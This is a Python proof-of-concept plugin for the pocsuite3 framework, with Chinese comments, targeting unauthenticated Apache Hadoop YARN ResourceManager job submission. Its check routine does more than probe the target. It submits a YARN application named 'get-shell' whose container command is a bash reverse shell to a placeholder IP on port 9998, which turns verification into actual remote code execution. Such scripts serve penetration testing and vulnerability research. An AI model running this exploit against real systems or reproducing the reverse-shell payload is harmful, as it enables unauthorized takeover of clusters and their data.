from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class HadoopPOC(POCBase):
    vulID = "0"
    version = "1"
    author = "kelemao"
    vulDate = "2022-10-17"
    createDate = "2022-10-17"
    updateDate = "2022-10-17"
    references = ["http://wiki.peiqi.tech/wiki/webserver/"]
    name = "Apache Hadoop 后台存在远程命令执行漏洞"
    appPowerLink = "http://wiki.peiqi.tech/wiki/webserver/"
    appName = "Apache Hadoop"
    appVersion = "all"
    vulType = VUL_TYPE.COMMAND_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    # samples = []
    # install_requires = []
    desc = """Hadoop Yarn RPC未授权访问漏洞存在于Hadoop Yarn中负责资源管理和任务调度的ResourceManager，成因是该组件为用户提供的RPC服务默认情况下无需认证即可访问"""  # 漏洞简要描述
    pocDesc = """直接抓包改路径即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        url = self.url.strip() + "/ws/v1/cluster/apps"
        headers = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json"}
        json = {
            "am-container-spec": {"commands": {"command": "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9998 0>&1"}},
            "application-id": "application_1655112607010_0005", "application-name": "get-shell",
            "application-type": "YARN"}

        result = []

        try:

            response = requests.post(url=url, headers=headers, json=json, verify=False, timeout=9, allow_redirects=False)
            # 判断是否存在漏洞
            if response.status_code == 202:
                result.append(url)
        except Exception:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(HadoopPOC)